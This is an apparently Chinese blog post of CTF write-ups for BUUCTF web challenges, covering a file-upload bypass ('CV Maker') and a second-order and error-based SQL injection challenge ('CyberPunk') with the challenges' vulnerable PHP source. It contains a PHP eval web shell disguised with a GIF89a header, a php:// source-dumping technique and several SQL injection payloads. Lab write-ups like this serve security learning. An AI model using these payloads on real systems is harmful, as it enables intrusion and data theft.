<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>buuctf_web部分刷题记录_PART3 | 逃    避    現    實</title><meta name="keywords" content="CTF-Web"><meta name="author" content="1ustinianus"><meta name="copyright" content="1ustinianus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="我是菜鸡">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf_web部分刷题记录_PART3">
<meta property="og:url" content="http://gswanx.github.io/post/383bfb1c.html">
<meta property="og:site_name" content="逃    避    現    實">
<meta property="og:description" content="我是菜鸡">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://gswanx.github.io/img/headddd.jpg">
<meta property="article:published_time" content="2022-10-27T01:20:56.000Z">
<meta property="article:modified_time" content="2022-10-28T12:19:24.384Z">
<meta property="article:author" content="1ustinianus">
<meta property="article:tag" content="CTF-Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://gswanx.github.io/img/headddd.jpg"><link rel="shortcut icon" href="/img/17150526893.png"><link rel="canonical" href="http://gswanx.github.io/post/383bfb1c"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'buuctf_web部分刷题记录_PART3',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-28 20:19:24'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/title.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3571753_hc60oskdsr8.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/headddd.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/754566.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">逃    避    現    實</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">buuctf_web部分刷题记录_PART3</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-27T01:20:56.000Z" title="发表于 2022-10-27 09:20:56">2022-10-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-28T12:19:24.384Z" title="更新于 2022-10-28 20:19:24">2022-10-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/%E5%88%B7%E9%A2%98/">刷题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="buuctf_web部分刷题记录_PART3"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="文件上传-CV-Maker"><a href="#文件上传-CV-Maker" class="headerlink" title="[文件上传]CV Maker"></a>[文件上传]CV Maker</h1><p>注册信息进来之后有一个上传图片的界面</p>
<p><img src="/../images/buuctf-web3/image-20221027094905559.png" alt="image-20221027094905559"></p>
<p>这里会对上传的文件进行<code>exif</code>的检测, 所以这里在一句话木马签名加上:<code>GIF89a</code>绕过检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>在上传后的网页源码中的本应加载图片的位置,能够找到上传的路径:</p>
<p><img src="/../images/buuctf-web3/image-20221027095054440.png" alt="image-20221027095054440"></p>
<p>蚁剑连接后在根目录找到flag</p>
<p><img src="/../images/buuctf-web3/image-20221027095116375.png" alt="image-20221027095116375"></p>
<br>

<hr>
<br>

<h1 id="二次注入-报错注入-CyberPunk"><a href="#二次注入-报错注入-CyberPunk" class="headerlink" title="[二次注入,报错注入]CyberPunk"></a>[二次注入,报错注入]CyberPunk</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php 提交订单</span><br><span class="line">delete.php 删除订单</span><br><span class="line">search.php 查订单</span><br><span class="line">change.php 改收货地址</span><br></pre></td></tr></table></figure>

<p>源码最下面还看到了提示, 通过file参数来进行文件包含?</p>
<img src="../images/buuctf-web3/image-20221027095628104.png" alt="image-20221027095628104" style="zoom: 80%;" />



<p>利用<code>php://</code>协议把源码搞下来:</p>
<p><code>index.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>search.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>search</code>中存在一定的过滤, 但是因为禁用了<code>select</code>等关键词, 同时尝试使用<code>show,prepare</code>等进行堆叠注入也没有效果, 所以还需要去看看其他的源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">123&#x27;&amp;&amp;length(database())=4</span><br><span class="line">123&#x27;&amp;&amp;1=1#  返回信息</span><br><span class="line">123&#x27;&amp;&amp;1=2#  信息不全</span><br><span class="line">123&#x27;&amp;&amp;(length(database())=8)# 返回信息</span><br><span class="line">12&#x27;;show databases;#</span><br><span class="line">123&#x27;&amp;&amp;extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">12&#x27;||extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br></pre></td></tr></table></figure>



<p><code>config.php</code>: 这里能够找到库名, 而且知道了是以<code>root</code>权限登录的</p>
<p>那么这里想到<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>可以使用root的权限去执行load_file读取文件这样的功能</span></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p><code>change.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]); <span class="comment"># 这里在单双引号等前面加了反斜杠</span></span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>confirm.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$user_name</span>.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$user_name</span>, <span class="variable">$address</span>, <span class="variable">$phone</span>);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

